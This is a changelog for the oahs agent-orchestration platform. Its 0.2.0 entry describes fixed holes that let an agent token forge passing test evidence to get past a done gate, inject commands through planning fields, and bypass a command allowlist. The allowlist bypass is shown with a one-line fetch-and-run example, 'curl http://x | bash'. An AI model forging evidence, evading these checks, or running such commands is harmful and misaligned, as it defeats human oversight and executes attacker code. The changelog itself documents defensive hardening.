# Changelog — oahs

The oahs platform only. The root `CHANGELOG.md` belongs to upstream BMAD-METHOD,
whose tree this fork carries; it is not ours to write in.

Versions are sourced from [`oahs-version.json`](oahs-version.json) and tagged
`oahs-v*` — never `v*`, which is upstream's tag namespace.

## 0.2.0 — 2026-07-26

A security and survivability release. **0.1.x let any authenticated token forge the
evidence a done gate is judged on**, and had no backup of any kind. Both are closed.

### Fixed — the thesis, made true in code

The product sells one sentence: *evidence is MEASURED by a runner, not asserted by
whoever asks; only commands pinned before the agent ran are guards.* Four holes meant
that sentence was prose, not behaviour. Each is now a conformance pin
(`packages/core/test/CONFORMANCE.md`, sections 0.2a–0.2d) enforced on both engines.

- **`submit_evidence` required no permission, no claim and no fencing token.** Any actor
  holding any token — including the six `provision_personas` agents, whose floor-state
  role is `contributor` (`[]`) — could append `test_run{exitCode:0}` plus
  `commit{reachableOnRemote:true}` to any work item. Because both evidence guards take
  the LATEST row of each kind, appending after the real failing measurement turned the
  done gate green on facts nobody measured. This is the "fake-done" the whole design
  exists to refuse, and it needed only a token — strictly weaker than the documented
  honest-operator floor. Now: an `evidence.submit` grant is required, and
  verdict-bearing evidence on a live-claimed item must present that claim's fencing
  token. Context evidence (`review_report`) is deliberately exempt from the fencing
  half, because a reviewer legitimately posts one while the worker holds the claim.
- **The whole planning surface was ungated.** `create_work_item`, `create_feature`,
  `import_stories` and `project_create` performed no permission check at any layer. That
  mattered more than an ordinary missing check because `create_work_item` is the write
  path for `invokeDevWith`, which the runner interpolates into the agent command it
  executes — so a zero-grant token could write a string that runs on an operator's
  machine, in the process holding the push credential and the ssh-agent socket. Now
  gated on `task.plan` / `feature.init`. An earlier doc claim that `feature.init` was
  "enforced at the ops layer" was false and is retracted.
- **The pinned-command "allowlist" was decorative.** The runner checked the first
  whitespace token, then handed the whole string to `bash -c` — and the list contained
  `sh` and `bash`. `pnpm test; curl http://x | bash` passed on the strength of `pnpm`,
  making `gate.spec.approve` equivalent to code execution on every machine that runs a
  claim. Now: shell metacharacters are refused where the pin is WRITTEN, `sh`/`bash` are
  out of the allowlist, and the runner executes argv with `shell: false`. Compose two
  commands as two array entries, which is what `pinnedVerification` already was.
- **A passing test could certify a different commit than it measured.** The runner
  normalizes the worktree to HEAD before verifying, which makes the claim true; nothing
  made it checkable. `test_run` now carries the revision it measured and the done gate
  refuses a mismatch. Evidence without a revision (pre-0.2.0) is judged exactly as before.

### Added

- **`oahs backup` / `oahs restore`.** There was no backup, export or dump command of any
  kind; the only guidance anywhere sanctioned copying a live PGlite directory, which
  yields an unopenable copy. `backup` takes the same cross-process lock `serve` takes, so
  a torn archive is unreachable rather than discouraged, and archives `pg/` +
  `tokens.json` + the schema version as ONE artifact (restoring a database beside a
  mismatched credential store gives you actors with no usable tokens). `restore` refuses a
  non-empty target and an archive from a newer schema.
  *During implementation the first version of this locked the wrong path and happily
  backed up a live directory. The refusal is now the first assertion in its test.*
- **Observability.** The spine ran `logger: false` with 24 free-text `stderr` writes as
  its entire diagnostic surface. Now JSON request logs carrying `reqId`, `actorId`,
  status and duration (the token is never logged, only the actor it resolved to), a
  `warn` line for a rejected credential — previously recorded nowhere — and a **`/readyz`
  that touches the engine**. `/healthz` returned a hardcoded `{ok:true}` and never did, so
  a spine whose PGlite worker had died still reported healthy and the container
  HEALTHCHECK never noticed; the HEALTHCHECK now probes `/readyz`. `OAHS_LOG=silent`
  restores silence.
- **Graceful shutdown.** Nothing anywhere handled `SIGTERM`, so every `docker stop`,
  `compose restart` and Ctrl-C was an unclean exit. Now drains Fastify, stops the reaper
  and releases the data-dir lock.
- **`serve --host`**, defaulting to `127.0.0.1`. The from-source path used to publish an
  admin-token-guarded spine to the whole LAN with no way to change it. Containers pass
  `--host 0.0.0.0` explicitly.
- **`make lint-oahs`**, wired into `make check`: type-aware ESLint over ~49k LOC that had
  `tsc --noEmit` as its only static gate. It enforces the §0.1 spine-import boundary as a
  RULE against the compiler's module graph — catching what the CI greps structurally
  cannot (the `ui-src` tree, a provider outside the six grep literals, a transitive
  reach). It found 4 dead bindings and **zero floating promises**.
- **A `SIGKILL` durability test.** The only persistence test restarted through a graceful
  `close()`; nothing killed a process and reopened the dir. A committed write survives —
  so the absent `pglite.close()` is not the data-loss risk it looks like, which is now an
  established fact rather than an assumption.

### Fixed — tests

- **The flaky wall-clock lease tests are fixed, not retried.** One claimed with a 100ms
  TTL and then asserted the lease was still live; under full-suite load more than 100ms
  elapsed first, so it failed reliably in the suite and passed in isolation. Rebudgeted
  with margins, and the runner heartbeat test's TTL raised to 3x its observed
  synchronous-git tail. A red build that goes green on retry teaches everyone to re-run
  instead of read.
- `--port 0` (the ephemeral-port idiom) is accepted; only the validator rejected it,
  which forced anything driving the real binary to hardcode a port.

### Still NOT in it

Unchanged from 0.1.1: no Postgres server, no migrations, no multi-tenancy
(`workspace_id` exists on no table), grant scopes stored but not enforced, no metering /
billing / SSO / audit signing, and **nothing is published** — the binary is
`apps/oahs/bin/oahs.mjs` after `make build` and must be aliased. A killed server's data
dir is unopenable for ~20s while its lock goes stale.

## 0.1.1 — 2026-07-18

A corrective release. **0.1.0 shipped a data-loss bug**; this is the version to run.

### Fixed

- **Two `oahs serve` on one data dir no longer destroy it.** PGlite does not lock its
  directory, so two servers — two terminals, or a service restart racing a manual start,
  both defaulting to `~/.oahs/data` — both accepted writes and then corrupted the dir
  (`RuntimeError: Aborted()` at the next open). `oahs serve` now takes a cross-process
  lock and a second server refuses with a clear message. This was present in 0.1.0.
- **`$OAHS_PORT` is honoured by `serve`.** The runtime image advertised it and health-checked
  that port while `serve` read only `--port`, so `docker run -e OAHS_PORT=8080` bound 4521
  and the container was unhealthy forever.
- Two APIs stopped pretending: a scoped grant is now refused rather than silently applied
  globally, and `oahs ping` no longer constructs a meter nothing reads.

### Added

- **Schema-version guard.** `oahs serve` refuses to open a data dir written by a newer
  binary than itself, so an old binary cannot corrupt a newer dir. `GET /version` reports
  the `schemaVersion` it enforces.
- **CI for the carried BMAD tree and repo-wide style** (`tools` and `style` jobs), both
  now required. The carried installer no longer phones upstream's npm registry or steers
  fork users to install upstream over this fork.

### Docs

- Corrected claims that asserted machine-enforcement the code lacks (the "no writes outside
  the command bus" invariant holds by construction, not a lint rule; actor type is never a
  source of authority but two opt-in policy checks can restrict by it).

## 0.1.0 — 2026-07-17

First tagged version. It marks the point where the container execution path was
proven against a real Docker daemon in CI rather than a stub, which is the thing
that makes the rest worth versioning.

### What is in it

- **Deterministic spine.** Lifecycle, gates, claims, and evidence live behind a
  command bus; `packages/core/test/CONFORMANCE.md` is the specification, and the
  same suite runs against the in-memory engine and PGlite so the two cannot drift.
- **No model in the control loop.** CI greps `packages/{core,db,contracts}` and
  `apps/spine-api` for LLM SDKs and gateway imports on every push.
- **MCP and HTTP are the same surface**, structurally — `apps/spine-api/test/parity.test.ts`
  deep-equals them rather than trusting that they match.
- **Container-isolated execution (§10).** `oahs dispatch` claims work on the host
  with a static token, mints a job-scoped mutation-only token, and runs one
  container per claim. The agent container never receives the admin token, a push
  credential, or a Docker client — the last one is a failing CI assertion, not a
  convention. It DOES receive the model credentials its agent needs, on the inner
  `oahs work --agent-env` argv rather than in its environment, so they are not
  inherited by everything the agent shells out to. They never reach the spine.
- **Claim-scoped push credentials, a durability push, and spine-driven adoption**
  of a claim branch across machines.
- **A lease reaper** that records expiries without deciding anything.
- **A version surface**: `oahs --version` and `GET /version`, compiled from one file
  into the bundle, so they cannot drift. The OCI image labels take a `--build-arg`
  the release workflow feeds from that same file; an image you build by hand is
  honestly labelled `dev`.

### What is NOT in it

Stated plainly, because the absence of a feature is easier to mistake for its
presence than the reverse:

- **No Postgres server.** `serve` offers `memory` and `pglite` only, and nothing
  reads a `DATABASE_URL`. Note what this does NOT mean: `PgEngine` is not shelf-ware
  waiting to be wired — it IS the durable engine, and `serve --data` (the default,
  and what compose runs) is `PgEngine` on embedded PGlite. What is missing is a
  connection to a real Postgres server, not the engine.
- **No migrations**, but the schema is versioned. Idempotent, additive DDL is re-applied
  on every open. There is no down-migration; instead `oahs serve` REFUSES to open a data
  dir stamped by a newer binary than itself (`schema v… will not open it`), so an old
  binary cannot corrupt a newer dir. `GET /version` reports the same `schemaVersion`.
- **Nothing locks the data dir.** A second `oahs serve` on a directory already being
  served DESTROYS it, and needs no flags to do so: `--data` defaults to `~/.oahs/data`,
  so two bare `oahs serve` target the same place. Both accept writes and answer 200;
  the directory then fails to open at the next start with `RuntimeError: Aborted()`
  and does not recover. Run one spine per data dir, and copy the directory only while
  the server is stopped.

  0.1.0 shipped this bullet saying "two BINARIES against one data dir is possible and
  silent", filed under "No migrations". Every part of that was wrong: the trigger is a
  second PROCESS, not a second version; it is not about schema at all; and the
  inference it invited — "I am fine as long as I run one version" — is precisely the
  belief that loses your data.
- **No multi-tenancy.** There is no `workspace_id` column on any table.
- **Grant scopes are stored but not enforced.**
- **No metering, billing, SSO, or audit signing.**
- **No published image or package.** Images are built locally; nothing is on npm
  or a registry.

### Security posture

Evidence collected on a developer machine is only as strong as the honest-operator
assumption behind it. The §8 push guard, scoped tokens, and the container boundary
raise the cost of a dishonest agent; they do not make one impossible.
